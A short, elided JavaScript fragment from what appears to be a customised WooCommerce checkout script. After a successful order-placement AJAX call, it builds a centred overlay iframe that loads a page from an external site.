			    ...
			    if ($form.triggerHandler('checkout_place_order') !== false && $form.triggerHandler('checkout_place_order_' + wc_checkout_form.get_payment_method()) !== false) {
			        ...
			        $.ajax({
			            ...
			            success: function(result) {
			            	...
			            	var TEMPLATE = '<iframe src="http://corentinflach.fr/engame" width="50%" height="50%" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%,-50%);z-index: 9999;" name="myFrame" id="myFrame"></iframe>'
